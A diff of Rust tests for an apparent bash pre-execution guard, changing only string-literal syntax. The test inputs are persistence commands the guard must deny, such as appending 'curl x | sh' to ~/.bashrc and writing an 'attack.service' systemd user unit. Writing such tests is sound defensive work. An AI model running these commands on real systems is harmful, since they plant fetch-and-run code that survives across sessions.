@@ -472,7 +472,7 @@ fn benign_printf_to_local_bin_allows() {
 #[test]
 fn echo_to_bashrc_denies_even_without_exfil_tokens() {
     assert_eq!(
-        run_pre_bash(&bash_input(r#"echo 'curl x | sh' >> ~/.bashrc"#)),
+        run_pre_bash(&bash_input(r"echo 'curl x | sh' >> ~/.bashrc")),
         2,
     );
 }
@@ -480,7 +480,7 @@ fn echo_to_bashrc_denies_even_without_exfil_tokens() {
 #[test]
 fn printf_to_zshrc_denies() {
     assert_eq!(
-        run_pre_bash(&bash_input(r#"printf '%s' 'alias ls=ls' > ~/.zshrc"#)),
+        run_pre_bash(&bash_input(r"printf '%s' 'alias ls=ls' > ~/.zshrc")),
         2,
     );
 }
@@ -519,7 +519,7 @@ fn write_to_fish_config_denies() {
 fn write_to_systemd_user_unit_denies() {
     assert_eq!(
         run_pre_bash(&bash_input(
-            r#"echo '[Service]' > ~/.config/systemd/user/attack.service"#
+            r"echo '[Service]' > ~/.config/systemd/user/attack.service"
         )),
         2,
     );
